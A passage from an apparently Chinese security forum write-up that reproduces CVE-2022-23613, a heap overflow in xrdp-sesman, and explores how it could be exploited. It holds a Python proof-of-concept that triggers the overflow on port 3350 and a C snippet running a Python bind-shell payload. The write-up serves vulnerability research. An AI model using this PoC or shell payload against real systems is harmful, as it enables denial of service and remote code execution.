---
title: CVE-2022-23613复现与漏洞利用可能性尝试
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458479751&idx=2&sn=d8815a87725c397271c5d6ee9447a1e0&chksm=b18e5c0d86f9d51b5b87bdfbb7a895e5f5887457e614f23379d8e09755492f7fd1c743ce22d9&scene=58&subscene=0#rd
source: 看雪学院
date: 2022-10-29
fetch_date: 2025-10-03T21:14:12.422797
---

# CVE-2022-23613复现与漏洞利用可能性尝试

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HpIfmoah1dOUIuxHB8sibPRKAWicbibo5HCKQNOdBEu9fnkz9hwsgN4X3akqNibQW1AHiagP8OiaKPcGcg/0?wx_fmt=jpeg)

# CVE-2022-23613复现与漏洞利用可能性尝试

Tokameine

看雪学苑

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HpIfmoah1dOUIuxHB8sibPR8AFoOz7hDMC0gpVFJBQTJKxClPd7ic5aQMvQsFvb1zbn5SvaWA5u3tQ/640?wx_fmt=jpeg)

本文为看雪论坛精华文章

看雪论坛作者ID：Tokameine

因为很少做过真实场景下的漏洞复现，深感自己知识的浅薄，恰巧团里的师傅发了个洞，让我看看怎么利用，因此顺便做一个简陋的分析吧。

漏洞编号为 CVE-2022-23613，现已公开了相关信息。该漏洞作为一个运行在 root 权限下的 RDP 服务，由于该漏洞最终能够导致任意代码执行，因此笔者打算以提权作为最终的利用目标。

##

## 若本文存在任何纰漏，请务必与我联系，我会尽快修正本文内容。

##

##

```
一

复现环境
```

```
xrdp-sesman 0.9.18  The xrdp session manager  Copyright (C) 2004-2020 Jay Sorg, Neutrino Labs, and all contributors.  See https://github.com/neutrinolabs/xrdp for more information.
```

该项目的开源地址：*https://github.com/neutrinolabs/xrdp*

##

##

```
二

漏洞成因
```

```
static intsesman_data_in(struct trans *self){+ #define HEADER_SIZE 8    int version;    int size;     if (self->extra_flags == 0)    {        in_uint32_be(self->in_s, version);        in_uint32_be(self->in_s, size);-        if (size > self->in_s->size)+        if (size < HEADER_SIZE || size > self->in_s->size)        {-            LOG(LOG_LEVEL_ERROR, "sesman_data_in: bad message size");+            LOG(LOG_LEVEL_ERROR, "sesman_data_in: bad message size %d", size);            return 1;        }        self->header_size = size;@@ -302,11 +303,12 @@ sesman_data_in(struct trans *self)            return 1;        }        /* reset for next message */-        self->header_size = 8;+        self->header_size = HEADER_SIZE;        self->extra_flags = 0;        init_stream(self->in_s, 0); /* Reset input stream pointers */    }    return 0;+ #undef HEADER_SIZE} /******************************************************************************/
```

从已公开的 Patch 可以看出，它添加了一个对 size 变量的负数校验，似乎意味着整数溢出漏洞的存在，不妨跟踪一下该变量。

```
else /* connected server or client (2 or 3) */{    if (self->si != 0 && self->si->source[self->my_source] > MAX_SBYTES)    {    }    else if (self->trans_can_recv(self, self->sck, 0))    {        cur_source = XRDP_SOURCE_NONE;        if (self->si != 0)        {            cur_source = self->si->cur_source;            self->si->cur_source = self->my_source;        }        read_so_far = (int) (self->in_s->end - self->in_s->data);        to_read = self->header_size - read_so_far;         if (to_read > 0)        {            read_bytes = self->trans_recv(self, self->in_s->end, to_read);
```

查找 self->header\_size 的引用，可以发现该变量将与 self->trans\_recv 的参数间接相关，而该函数类似于 read 的作用，将 self 相关的套接字中读取 to\_read 个字符到 self->in\_s->end 。

而该缓冲区来自于：

```
struct trans *trans_create(int mode, int in_size, int out_size){    struct trans *self = (struct trans *) NULL;     self = (struct trans *) g_malloc(sizeof(struct trans), 1);     if (self != NULL)    {        make_stream(self->in_s);        init_stream(self->in_s, in_size);        make_stream(self->out_s);        init_stream(self->out_s, out_size);        self->mode = mode;        self->tls = 0;        /* assign tcp calls by default */        self->trans_recv = trans_tcp_recv;        self->trans_send = trans_tcp_send;        self->trans_can_recv = trans_tcp_can_recv;    }     return self;}
```

```
#define init_stream(s, v) do \    { \        if ((v) > (s)->size) \        { \            g_free((s)->data); \            (s)->data = (char*)g_malloc((v), 0); \            (s)->size = (v); \        } \        (s)->p = (s)->data; \        (s)->end = (s)->data; \        (s)->next_packet = 0; \    } while (0)
```

可以看见，该缓冲区会通过 g\_malloc 创建在堆上，那么只要 to\_read 的值超出了堆的原始大小，就有可能造成堆溢出了：

```
g_list_trans = trans_create(TRANS_MODE_TCP, 8192, 8192);
```

从调用点也可以看出，每次建立一个新的连接时都会为该连接创建一个大小为 0x2000 的输入缓冲区，并且接下来将会调用 trans\_check\_wait\_objs ：

```
inttrans_check_wait_objs(struct trans *self){    ......    if (self->type1 == TRANS_TYPE_LISTENER) /* listening */    {        ......    }    else /* connected server or client (2 or 3) */    {        if (self->si != 0 && self->si->source[self->my_source] > MAX_SBYTES)        {        }        else if (self->trans_can_recv(self, self->sck, 0))        {            cur_source = XRDP_SOURCE_NONE;            if (self->si != 0)            {                cur_source = self->si->cur_source;                self->si->cur_source = self->my_source;            }            read_so_far = (int) (self->in_s->end - self->in_s->data);            to_read = self->header_size - read_so_far;             if (to_read > 0)            {                read_bytes = self->trans_recv(self, self->in_s->end, to_read);                ......            }        ......    }     return rv;}
```

如果创建的类型不为 TRANS\_TYPE\_LISTENER ，那么该连接就会调用 self->trans\_recv 将数据直接读进刚刚创建的输入缓冲区中，且由于它并没有校验 self->header\_size 可能是负数的情况，因此可以令 to\_read 通过负数减去一个正数溢出为一个极大的正数，从而导致堆溢出。

POC：

```
import socketimport structif __name__ == "__main__":    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    s.connect(("127.0.0.1",3350))    sdata = b''    sdata += struct.pack("I",0x2222CCCC) #version    sdata += struct.pack(">I",0x80000000) #headersize    s.send(sdata)    sdata = b'a'*0x10000  #padding    s.send(sdata)
```

##

##

```
三

漏洞利用
```

回顾一下刚刚的 trans\_create 可以发现：

```
struct trans *trans_create(int mode, int in_size, int out_size){    struct trans *self = (struct trans *) NULL;     self = (struct trans *) g_malloc(sizeof(struct trans), 1);    ......        self->trans_recv = trans_tcp_recv;        self->trans_send = trans_tcp_send;        self->trans_can_recv = trans_tcp_can_recv;    return self;}
```

struct trans self 结构体与输入输出缓冲区同样位于堆内存中，并且它还初始化了函数指针，那么一个可行的利用点就是：通过堆溢出去覆盖 self->trans\_recv 偏移处的值为一个类似 system 的函数来进行任意命令执行。

通过 IDA 搜索可以找到如下两个函数：

```
extern:00000000004105D8                 extrn g_execvp:nearextern:0000000000410658                 extrn g_execlp3:near
```

这两个命令分别是 execvp 和 execlp 的包装，函数实现如下：

```
intg_execvp(const char *p1, char *args[]){    ......    args_len = 0;    while (args[args_len] != NULL)    {        args_len++;    }    g_strnjoin(args_str, ARGS_STR_LEN, " ", (const char **) args, args_len);     g_rm_temp_dir();    rv = execvp(p1, args);    ......} intg_execlp3(const char *a1, const char *a2, const char *a3){    ......    g_strnjoin(args_str, ARGS_STR_LEN, " ", args, 2);    ......    g_rm_temp_dir();    rv = execlp(a1, a2, a3, (void *)0);    ......}
```

因为 xrdp 服务是通过 socket 进行通信的，因此让其打开 “/bin/sh” 是不够的，想要让它能够完成任意命令执行，最好还是让它反弹一个 shell 出来比较合适，比方说：

```
#include<stdlib.h>int main(){    char ars2[]="-cimport socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"\",10000));s.listen();c,_=s.accept();f=c.fileno();os.dup2(f,0);os.dup2(f,1);os.dup2(f,2);os.system(\"sh\");";    execlp("python3","python3",ars2,0);    return 0;}
```

这个格式就比较像 g\_execlp3 的实现了对吗？看起来似乎相当可行，但是笔者在经过各种各样的尝试以后放弃了这个做法，因为精准的控制参数是一件极其困难的事情。

###

### 参数控制的难点

```
read_bytes = self->trans_recv(self, self->in_s->end, to_read);
```

假设我们令 self->trans\_recv 为 g\_execlp3 ，那么我们就需要令 self 指向 “python3”，self->in\_s->end 也是一个指向 “python3” 字符串的指针，以及 to\_read 必须为一个指向参数的指针。

通过 IDA 搜索二进制程序中的字符串可以发现，唯一一个或许能用的字符串只有 "/bin/sh"，因此所有的参数字符串都需要我们一起放在 payload 中输入到内存里去才行。

但是有与常规的 CTF PWN 题不同的是，用户通过 socket 进行交互，泄露地址是一件比较麻烦的事情，大部分情况下甚至连回显都拿不到，更何况就算有办法拿到回显，泄露地址的参数也仍然需要控制，因此又要绕回到这个问题上，因此只好考虑如何在无地址的情况下完成利用。

###

### 覆盖结构体的细节

```
struct trans{    tbus sck; /* socket handle */    int mode; /* 1 tcp, 2 unix socket, 3 vsock */    int status;    int type1; /* 1 listener 2 server 3 client */    ttrans_data_in trans_data_in;    ttrans_conn_in trans_conn_in;    void *callback_data;    int header_size;    struct stream *in_s;    struct stream *out_s;    char *listen_filename;    tis_term is_term; /* used to test for exit */    struct stream *wait_s;    char addr[256];    char port[256];    int no_stream_init_on_data_in;    int extra_flags; /* user defined */    struct ssl_tls *tls;    const char *ssl_protocol; /* e.g. TLSv1, TLSv1.1, TLSv1.2, unknown */    const char *cipher_name;  /* e.g. AES256-GCM-SHA384 */    trans_re...